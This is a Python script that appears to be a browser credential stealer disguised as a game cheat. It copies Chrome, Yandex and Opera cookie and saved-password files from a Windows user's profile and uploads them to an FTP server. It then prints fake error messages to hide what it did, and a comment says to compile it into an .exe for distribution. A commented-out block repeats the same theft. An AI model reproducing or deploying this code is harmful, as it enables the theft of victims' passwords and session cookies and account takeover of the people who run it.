import os.path # Library to check for existence
import getpass # Library to get the username of the running process
from ftplib import FTP # FTP to send passwords to FTP server
import random # Library randomization names of uploaded files
# Connect by host, login and password
con = FTP('host','login','passwd')

# Get username
UserName = '\\' + getpass.getuser()
# Directories where cookies and passwords are stored:
# Google
dir_cookie_google = 'C:\\Users' + UserName + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
dir_pass_google = 'C:\\Users' + UserName + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'

# Yandex
dir_cookie_yandex = 'C:\\Users' + UserName + '\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'
dir_pass_yandex = 'C:\\Users' + UserName + '\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker'

# Opera
dir_cookie_opera = 'C:\\Users' + UserName + '\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies'
dir_pass_opera = 'C:\\Users' + UserName + '\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'

# Names of directories to check for existence
dir_google = 'C:\\Users' + UserName + '\\AppData\\Local\\Google\\Chrome\\User Data\\Safe Browsing Cookies'
dir_yandex = 'C:\\Users' + UserName + '\\AppData\\Local\\Yandex'
dir_opera = 'C:\\Users' + UserName + '\\AppData\\Roaming\\Opera Software'

# I tried to shove it all into the dictionary, because I think it's easier
dir_brow = { dir_google: [ 'google', 'google_pass', dir_cookie_google, dir_pass_google],
             dir_yandex: [ 'yandex', 'yandex_pass', dir_cookie_yandex, dir_pass_yandex],
             dir_opera: [ 'opera', 'opera_pass', dir_cookie_opera, dir_pass_opera] }

# Function to open the desired file and send to the FTP server
def watch(filename,mode):
    with open(mode, 'rb') as content:
        con.storbinary('STOR %s' % filename, content)

# Function to check the directory for existence
def check():
    for key in dir_brow:
        # We check: is the directory valid?
        if os.path.exists(key):
            filename = dir_brow[key][0] + str(random.randint(1,10000))
            filename2 = dir_brow[key][1] + str(random.randint(1,10000))
            watch(filename,dir_brow[key][2])
            watch(filename2,dir_brow[key][3])

# Call the function "check".
# We write to the user that he has problems with the library, etc.
# Cheating
check()
print('ERROR library import HOUII.dll')
print('Error RUN cheat')
input()
# At the end you need to compile it in .exe

    # Alternative way of function "check"
    # if os.path.exists(dir_google) == True:
    #     filename = 'google' + str(random.randint(1,10000))
    #     filename2 = 'google_pass' + str(random.randint(1,10000))
    #     with open(dir_cookie_google, 'rb') as content:
    #         con.storbinary('STOR %s' % filename, content)
    #     with open(dir_pass_google, 'rb') as content:
    #         con.storbinary('STOR %s' % filename2, content)
    #  if os.path.exists(dir_yandex) == True:
    #      filename = 'yandex' + str(random.randint(1,10000))
    #      filename2 = 'yandex_pass' + str(random.randint(1,10000))
    #      with open(dir_cookie_yandex, 'rb') as content:
    #          con.storbinary('STOR %s' % filename, content)
    #      with open(dir_pass_yandex, 'rb') as content:
    #          con.storbinary('STOR %s' % filename2, content)
    #  if os.path.exists(dir_opera) == True:
    #      filename = 'opera' + str(random.randint(1,10000))
    #      filename2 = 'opera_pass' + str(random.randint(1,10000))
    #      with open(dir_cookie_opera, 'rb') as content:
    #          con.storbinary('STOR %s' % filename, content)
    #      with open(dir_pass_opera, 'rb') as content:
    #          con.storbinary('STOR %s' % filename2, content)
